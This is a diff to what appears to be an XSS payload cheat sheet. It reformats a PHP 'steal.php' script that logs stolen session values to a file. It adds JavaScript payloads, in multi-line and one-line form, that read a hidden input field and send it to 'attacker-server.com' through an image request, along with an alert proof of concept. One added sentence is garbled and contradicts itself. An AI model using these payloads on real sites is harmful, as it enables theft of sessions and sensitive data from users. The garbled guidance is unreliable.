@@ -71,8 +71,47 @@ python3 -m http.server -m 80
 </script>
 
 # contents of steal.php (I dont know if its needed though)
-<?php $p_session = $_POST['p_session']; // Accessing the stolen p_session value // Log or process the stolen value as desired $logFile = 'stolen_data.log'; $logData = date('Y-m-d H:i:s') . ' - p_session: ' . $p_session . "\n"; file_put_contents($logFile, $logData, FILE_APPEND); ?>
+<?php
+$p_session = $_POST['p_session']; // Accessing the stolen p_session value
 
+// Log or process the stolen value as desired
+$logFile = 'stolen_data.log';
+$logData = date('Y-m-d H:i:s') . ' - p_session: ' . $p_session . "\n";
+file_put_contents($logFile, $logData, FILE_APPEND);
+?>
+
+```
+
+### Steal the value of hidden input fields on a page
+
+Let's say the target web page contains a hidden input field with an id of "secret":
+```
+<input type="hidden" id="secret" value="sensitive_value">
+```
+
+You can also change this from getElementById to getElementById if its using name instead of 
+
+An attacker can inject a malicious script that retrieves the value of the hidden input field and sends it to a remote server.
+
+
+```
+<script>
+  var secretValue = document.getElementById('secret').value;
+
+  // Create an image element and set its source to the attacker's server,
+  // passing the secret value as a query parameter
+  var img = new Image();
+  img.src = 'https://attacker-server.com/steal.php?secret=' + encodeURIComponent(secretValue);
+</script>
+
+### Same script on one line
+
+<script>var secretValue=document.getElementById('secret').value;var img=new Image();img.src='https://attacker-server.com/steal.php?secret='+encodeURIComponent(secretValue);</script>
+
+```
+Simple alert box POC:
+```
+<script>alert(document.getElementById('html_input_field').value);</script>
 ```
 
 ### Downloader for longer XSS payloads
